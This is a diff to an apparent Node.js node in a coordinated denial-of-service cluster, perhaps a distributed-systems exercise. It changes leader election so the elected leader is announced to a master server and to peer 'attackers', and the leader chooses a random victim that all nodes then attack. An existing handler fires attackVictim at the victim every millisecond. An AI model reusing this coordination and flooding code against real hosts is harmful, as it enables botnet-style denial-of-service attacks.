@@ -63,13 +63,20 @@ function sendPortToMaster() {
 	});	
 }
 
-function sendLeaderToMaster(leader) {
+function sendLeaderToAll(leader) {
+	sendLeaderTo(leader, serverAddress);
+	for (var key in attackersData) {
+		sendLeaderTo(leader, "http://" + attackersData[key].ip + ":" + attackersData[key].port);
+	}
+}
+
+function sendLeaderTo(leader, address) {
 	request.post({
 	  headers: {"content-type" : "application/json"},
-	  url:     serverAddress + "/leader",
+	  url:     address + "/coordinator",
 	  body:    JSON.stringify({"leader": leader})
 	}, function(error, res, body){
-	  if (!(body === "LEADER")) {
+	  if (!(body === "OK")) {
 	  	console.log("I'm the leader");
 	  	sendAttackRequestToAll(chooseRandomVictim(JSON.parse(body)));
 	  }
@@ -112,7 +119,7 @@ function sendElectionTo(msg, ip, port) {
 	  	receivedAll++;
 	  	if (receivedAll === electionSent && leader) {
 	  		console.log("Received all");
-	  		sendLeaderToMaster(id);
+	  		sendLeaderToAll(id);
 	  	}
 	});
 }
@@ -129,7 +136,7 @@ function sendElectionToAll() {
 		}
 	}
 	if (electionSent === 0) {
-		sendLeaderToMaster(id);
+		sendLeaderToAll(id);
 	} else {
 		for (var key in attackersData) {
 			if (key > id) {
@@ -155,6 +162,11 @@ app.post("/victim", function(req, res) {
 	console.log("attacking...");
 	console.log(req.body.victim);
 	attackingInterval = setInterval(function () {attackVictim(req.body.victim)}, 1);
+	res.sendStatus(200);
+});
+
+app.post("/coordinator", function(req, res) {
+	console.log("The leader is: " + req.body.leader);
 	res.sendStatus(200);
 });
 
